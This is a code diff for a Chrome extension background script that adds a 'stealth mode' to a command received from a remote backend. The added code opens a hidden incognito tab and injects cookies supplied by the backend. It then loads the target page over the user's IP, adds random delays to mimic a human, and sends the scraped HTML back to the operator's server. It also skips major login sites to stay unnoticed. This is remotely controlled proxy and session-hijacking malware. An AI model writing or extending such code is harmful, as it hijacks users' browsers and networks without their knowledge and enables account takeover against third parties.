@@ -928,56 +928,189 @@ async function updateCommandStatus(command_id, status, error_message) {
 }
 
 // Handle proxy-fetch command (fetch URL using user's IP and cookies)
+// 🔒 PROTECTED DOMAINS - Never inject cookies here (Stealth Mode)
+const PROTECTED_DOMAINS = [
+  'google.com',
+  'accounts.google.com',
+  'mail.google.com',
+  'gmail.com',
+  'microsoft.com',
+  'login.microsoftonline.com',
+  'outlook.com',
+  'facebook.com',
+  'instagram.com',
+  'twitter.com',
+  'x.com'
+];
+
+// Helper: Check if domain is protected
+function isDomainProtected(url) {
+  try {
+    const hostname = new URL(url).hostname.toLowerCase();
+    return PROTECTED_DOMAINS.some(domain => 
+      hostname === domain || hostname.endsWith('.' + domain)
+    );
+  } catch (e) {
+    return false;
+  }
+}
+
+// Helper: Inject cookies with random delays (simulate human behavior)
+async function injectCookiesWithDelay(cookies, targetUrl, tabId) {
+  const injectedCookies = [];
+  
+  for (const cookie of cookies) {
+    try {
+      const targetDomain = new URL(targetUrl).hostname;
+      
+      // Check for conflicting cookies and remove them first
+      const existingCookies = await chrome.cookies.getAll({
+        name: cookie.name,
+        domain: cookie.domain || targetDomain
+      });
+      
+      for (const existing of existingCookies) {
+        await chrome.cookies.remove({
+          url: targetUrl,
+          name: existing.name,
+          storeId: existing.storeId
+        });
+      }
+      
+      // Inject new cookie
+      const injected = await chrome.cookies.set({
+        url: targetUrl,
+        name: cookie.name,
+        value: cookie.value,
+        domain: cookie.domain || targetDomain,
+        path: cookie.path || '/',
+        secure: cookie.secure !== false,
+        httpOnly: cookie.httpOnly || false,
+        sameSite: cookie.sameSite || 'lax',
+        expirationDate: cookie.expirationDate
+      });
+      
+      if (injected) {
+        injectedCookies.push(injected);
+      }
+      
+      // Random delay between 50-200ms (simulate human behavior)
+      await new Promise(resolve => setTimeout(resolve, 50 + Math.random() * 150));
+      
+    } catch (cookieError) {
+      log('warn', `Failed to inject cookie ${cookie.name}:`, cookieError);
+    }
+  }
+  
+  return injectedCookies;
+}
+
+// Helper: Clean up injected cookies
+async function cleanupInjectedCookies(cookies, targetUrl) {
+  for (const cookie of cookies) {
+    try {
+      await chrome.cookies.remove({
+        url: targetUrl,
+        name: cookie.name,
+        storeId: cookie.storeId
+      });
+    } catch (e) {
+      log('warn', `Failed to cleanup cookie ${cookie.name}:`, e);
+    }
+  }
+}
+
+// 🎯 STEALTH MODE: Proxy-fetch with isolated incognito tab
 async function handleProxyFetchCommand(data) {
-  const command_id = data.command_id; // ✅ Read from root level
+  const command_id = data.command_id;
   const { target_url, cookies: providedCookies } = data.payload;
   
-  log('info', `🌐 Proxy-fetch request for: ${target_url}`, { command_id });
+  log('info', `🌐 [STEALTH] Proxy-fetch request for: ${target_url}`, { command_id });
+  
+  let incognitoTab = null;
+  let injectedCookies = [];
   
   try {
-    // 1. Set cookies in the browser
-    if (providedCookies && Array.isArray(providedCookies)) {
-      const targetDomain = new URL(target_url).hostname;
-      for (const cookie of providedCookies) {
-        try {
-          await chrome.cookies.set({
-            url: target_url,
-            name: cookie.name,
-            value: cookie.value,
-            domain: cookie.domain || targetDomain,
-            path: cookie.path || '/',
-            secure: cookie.secure !== false,
-            httpOnly: cookie.httpOnly || false,
-            sameSite: cookie.sameSite || 'lax',
-            expirationDate: cookie.expirationDate
-          });
-        } catch (cookieError) {
-          log('warn', `Failed to set cookie ${cookie.name}:`, cookieError);
-        }
-      }
-      log('info', `✅ Set ${providedCookies.length} cookies for proxy fetch`);
+    const targetDomain = new URL(target_url).hostname;
+    
+    // 🔒 CHECK PROTECTED DOMAINS
+    if (isDomainProtected(target_url)) {
+      log('warn', `⚠️ [STEALTH] Protected domain detected: ${targetDomain}`);
+      log('warn', `⚠️ [STEALTH] Skipping cookie injection for security`);
+      
+      // Notify backend about protected domain
+      await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${CONFIG.SUPABASE_ANON_KEY}`
+        },
+        body: JSON.stringify({
+          command_id,
+          machine_id: machineId,
+          url: target_url,
+          form_data: {
+            error: `Protected domain: ${targetDomain}. Cookie injection blocked for user safety.`,
+            success: false,
+            protected: true
+          }
+        })
+      });
+      
+      return;
     }
     
-    // 2. Fetch using browser context (with user's IP and headers)
-    const response = await fetch(target_url, {
-      method: 'GET',
-      credentials: 'include',
-      headers: {
-        'User-Agent': navigator.userAgent,
-        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-        'Cache-Control': 'no-cache'
-      }
+    // 🕵️ CREATE ISOLATED INCOGNITO TAB
+    incognitoTab = await chrome.tabs.create({
+      url: 'about:blank',
+      active: false,
+      incognito: true
     });
     
-    if (!response.ok) {
-      throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+    log('info', `🔒 [STEALTH] Created incognito tab ${incognitoTab.id}`);
+    
+    // Wait for tab to be ready
+    await new Promise(resolve => setTimeout(resolve, 500));
+    
+    // 🍪 INJECT COOKIES WITH STEALTH DELAYS
+    if (providedCookies && Array.isArray(providedCookies) && providedCookies.length > 0) {
+      log('info', `🍪 [STEALTH] Injecting ${providedCookies.length} cookies with delays...`);
+      injectedCookies = await injectCookiesWithDelay(providedCookies, target_url, incognitoTab.id);
+      log('info', `✅ [STEALTH] Injected ${injectedCookies.length} cookies successfully`);
     }
     
-    const html = await response.text();
-    log('info', `✅ [ProxyFetch] Fetched ${html.length} bytes from ${target_url}`);
+    // 🌐 NAVIGATE TO TARGET URL IN INCOGNITO TAB
+    await chrome.tabs.update(incognitoTab.id, { url: target_url });
     
-    // 3. Send HTML back to backend via proxy-fetch-result (NOT popup-response!)
+    // Wait for page load
+    await new Promise((resolve, reject) => {
+      const timeout = setTimeout(() => reject(new Error('Page load timeout')), 30000);
+      
+      chrome.tabs.onUpdated.addListener(function listener(tabId, changeInfo) {
+        if (tabId === incognitoTab.id && changeInfo.status === 'complete') {
+          clearTimeout(timeout);
+          chrome.tabs.onUpdated.removeListener(listener);
+          resolve();
+        }
+      });
+    });
+    
+    // 📄 EXTRACT HTML FROM INCOGNITO TAB
+    const [result] = await chrome.scripting.executeScript({
+      target: { tabId: incognitoTab.id },
+      func: () => document.documentElement.outerHTML
+    });
+    
+    const html = result.result;
+    log('info', `✅ [STEALTH] Fetched ${html.length} bytes from ${target_url}`);
+    
+    // 🧹 CLEANUP INJECTED COOKIES
+    if (injectedCookies.length > 0) {
+      log('info', `🧹 [STEALTH] Cleaning up ${injectedCookies.length} injected cookies...`);
+      await cleanupInjectedCookies(injectedCookies, target_url);
+    }
+    
+    // 📤 SEND RESULT TO BACKEND
     const responseData = await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
       method: 'POST',
       headers: {
@@ -989,8 +1122,9 @@ async function handleProxyFetchCommand(data) {
         machine_id: machineId,
         url: target_url,
         html_content: html,
-        status_code: response.status,
-        success: true
+        status_code: 200,
+        success: true,
+        stealth_mode: true
       })
     });
     
@@ -998,12 +1132,12 @@ async function handleProxyFetchCommand(data) {
       throw new Error(`Failed to send response: ${responseData.status}`);
     }
     
-    log('info', `✅ [ProxyFetch] HTML result sent for command ${command_id}`);
+    log('info', `✅ [STEALTH] HTML result sent for command ${command_id}`);
     
   } catch (error) {
-    log('error', '[ProxyFetch] Fetch failed:', error);
+    log('error', '[STEALTH] Proxy-fetch failed:', error);
     
-    // Send error to backend via proxy-fetch-result
+    // Send error to backend
     try {
       await fetch(`${CONFIG.API_BASE}/proxy-fetch-result`, {
         method: 'POST',
@@ -1015,7 +1149,6 @@ async function handleProxyFetchCommand(data) {
           command_id,
           machine_id: machineId,
           url: target_url,
-          url: target_url,
           form_data: { 
             error: error.message,
             success: false
@@ -1026,7 +1159,16 @@ async function handleProxyFetchCommand(data) {
       log('error', 'Failed to send error response:', sendError);
     }
     
-    throw error;
+  } finally {
+    // 🗑️ ALWAYS CLOSE INCOGNITO TAB
+    if (incognitoTab) {
+      try {
+        await chrome.tabs.remove(incognitoTab.id);
+        log('info', `🗑️ [STEALTH] Closed incognito tab ${incognitoTab.id}`);
+      } catch (e) {
+        log('warn', 'Failed to close incognito tab:', e);
+      }
+    }
   }
 }
 
